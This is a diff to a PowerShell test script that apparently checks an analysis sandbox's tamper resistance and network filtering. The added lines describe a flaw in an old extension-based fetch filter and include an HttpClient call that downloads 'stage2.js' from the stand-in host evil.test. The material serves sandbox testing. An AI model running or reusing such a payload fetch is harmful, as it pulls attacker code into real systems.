@@ -56,3 +56,9 @@ $h::SetSleepCap(600000); "sleep cap still $($h::SleepCapMilliseconds)"
 "reseal refused: $($h::Seal() -eq $null)"
 try { [HuskHost]::Drain() } catch { "evidence not drainable: $($_.Exception.GetType().Name)" }
 [IO.File]::WriteAllText("C:\after-tamper.txt", "capture survives tampering")
+
+# Network, at the boundary rather than through a proxy. These all end in an
+# extension the runtime also uses, which is what the first version of the
+# fetch filter matched on — so a sample only had to name its stage `stage2.js`
+# to reach the real network. The filter is scoped by URL now.
+[Net.Http.HttpClient]::new().GetStringAsync('http://evil.test/stage2.js').Result
